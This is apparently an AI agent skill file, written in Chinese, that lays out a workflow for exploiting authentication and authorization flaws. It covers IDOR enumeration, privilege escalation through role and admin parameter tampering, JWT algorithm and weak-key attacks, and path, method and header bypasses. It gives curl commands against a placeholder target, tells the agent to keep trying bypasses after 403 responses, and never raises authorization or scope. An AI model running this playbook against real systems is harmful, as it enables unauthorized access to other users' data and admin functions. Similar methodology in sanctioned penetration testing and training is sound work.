---
name: auth-bypass
description: "检测、测试并利用认证绕过与授权缺陷漏洞，包括 IDOR 越权访问、JWT 令牌攻击、Session 劫持、权限参数篡改及路径/方法绕过。当目标存在登录功能、用户 ID 参数、JWT/Session 认证或角色权限控制时使用。"
allowed-tools: Bash, Read, Write
---

# 认证绕过 (Authentication Bypass)

绕过应用程序的认证和授权机制，获取未授权访问。

## 工作流程

```
侦察 → 识别认证类型 → 选择攻击路径 → 执行攻击 → 验证结果
                                              ↓ 失败
                                        尝试绕过技术 → 验证结果
                                              ↓ 仍失败
                                        切换攻击向量 → 回到选择攻击路径
```

### 阶段一：侦察与识别

1. 枚举所有 API 端点和可访问参数
2. 识别认证机制类型（JWT / Session Cookie / Token / Basic Auth）
3. 收集用户 ID 参数（user_id=, uid=, id=, account=）
4. 查找角色/权限相关参数（role=, is_admin=, level=, group=）
5. 检查前端 JS 中的隐藏 API 端点和参数

**验证点**: 确认已发现至少一个认证机制和可测试的端点，再进入攻击阶段。

### 阶段二：选择攻击路径

根据识别到的认证类型选择攻击向量：

| 认证类型 | 优先攻击 | 参考 |
|---------|---------|------|
| 用户 ID 参数 | IDOR 测试 | 本文件 |
| JWT Token | 算法篡改/密钥爆破 | [JWT_ATTACKS.md](JWT_ATTACKS.md) |
| Session Cookie | Session 固定/劫持 | [BYPASS_TECHNIQUES.md](BYPASS_TECHNIQUES.md) |
| 角色参数 | 权限参数篡改 | 本文件 |
| 路径访问控制 | 路径/方法绕过 | [BYPASS_TECHNIQUES.md](BYPASS_TECHNIQUES.md) |
| 默认登录页 | 尝试常见默认凭据 | 使用已知常见默认凭据 |

### 阶段三：执行攻击

---

## IDOR 测试（不安全的直接对象引用）

### 水平越权 — 访问其他用户数据

```bash
# 用当前用户 session 访问其他用户资源
curl "http://target.com/api/user/1" -H "Cookie: session=xxx"
curl "http://target.com/api/user/2" -H "Cookie: session=xxx"

# 资源 ID 遍历
curl "http://target.com/api/order/1001" -H "Cookie: session=xxx"
curl "http://target.com/api/order/1002" -H "Cookie: session=xxx"

# 文件名参数
curl "http://target.com/download?file=user1.pdf" -H "Cookie: session=xxx"
curl "http://target.com/download?file=user2.pdf" -H "Cookie: session=xxx"
```

**验证点**: 对比两个响应 — 如果返回了不属于当前用户的数据（不同 username、email、个人信息），确认 IDOR 存在。

**如果返回 403/401**: 不要直接放弃，先尝试以下绕过：
- 路径绕过技术（参见 [BYPASS_TECHNIQUES.md](BYPASS_TECHNIQUES.md)）
- 更换 HTTP 方法（GET → POST → PUT）
- 参数污染: `/api/user?id=1` → `/api/user?id=1&id=2`
- 数组语法: `/api/user?id[]=1&id[]=2`

### 垂直越权 — 访问管理员功能

```bash
# 用普通用户凭据访问管理端点
curl "http://target.com/api/admin/users" -H "Cookie: session=普通用户session"
curl "http://target.com/admin/dashboard" -H "Cookie: session=普通用户session"
```

**验证点**: 检查响应是否包含管理员专属数据（用户列表、系统配置、操作日志等）。200 响应且含有效数据 = 越权成功。

---

## 权限参数篡改

```bash
# 修改角色参数
curl -X POST "http://target.com/api/profile" \
  -H "Cookie: session=xxx" \
  -d '{"name":"test","role":"admin"}'

# 修改权限标志
curl -X POST "http://target.com/api/profile" \
  -H "Cookie: session=xxx" \
  -d '{"name":"test","is_admin":true}'

# 添加隐藏参数
curl -X POST "http://target.com/api/profile" \
  -H "Cookie: session=xxx" \
  -d '{"name":"test","admin":true,"level":99}'
```

**验证点**: 发送篡改请求后，重新获取用户 profile 或访问受限端点，确认权限是否实际提升。仅凭 200 响应不够 — 必须验证后续请求是否获得了新权限。

---

## JWT 攻击

详细攻击向量和工具用法参见 [JWT_ATTACKS.md](JWT_ATTACKS.md)。

核心流程：
1. 解码 JWT，分析 header（alg）和 payload（sub, role, admin 字段）
2. 尝试 alg:none 攻击 — 移除签名
3. 如果是 RS256，尝试切换到 HS256 + 公钥签名
4. 尝试弱密钥爆破
5. 尝试修改 payload 中的权限字段

**验证点**: 使用修改后的 JWT 发送请求，检查响应是否返回了更高权限的数据或功能。对比修改前后的响应差异。

---

## 绕过技术

当直接攻击被拦截时，使用以下技术，详见 [BYPASS_TECHNIQUES.md](BYPASS_TECHNIQUES.md)：

- **HTTP 方法绕过**: 切换 GET/POST/PUT/DELETE/PATCH，使用 X-HTTP-Method-Override 头
- **路径绕过**: 大小写变形、URL 编码、双重编码、添加扩展名、双斜杠
- **IP 限制绕过**: X-Forwarded-For 等头部伪造
- **前端验证绕过**: 直接调用后端 API，修改响应中的权限标志

---

## 常见指示器

识别目标是否存在认证绕过攻击面：

- 登录/注册功能
- URL 或请求体中的用户 ID 参数（user_id=, uid=, id=）
- JWT Token（Authorization: Bearer ...）
- Session Cookie（PHPSESSID, JSESSIONID 等）
- 角色/权限参数（role=, is_admin=, level=）
- API 端点模式（/api/admin/, /api/user/, /api/v1/）

## 最终验证清单

- [ ] 所有发现的 IDOR 都已通过实际数据泄露确认（而非仅凭状态码）
- [ ] JWT 攻击已验证修改后的 token 可获得更高权限
- [ ] 权限提升已通过访问受限功能确认（不只是参数返回变化）
- [ ] 403/401 响应已尝试路径和方法绕过后再结论
- [ ] 所有发现都有可复现的 PoC 命令
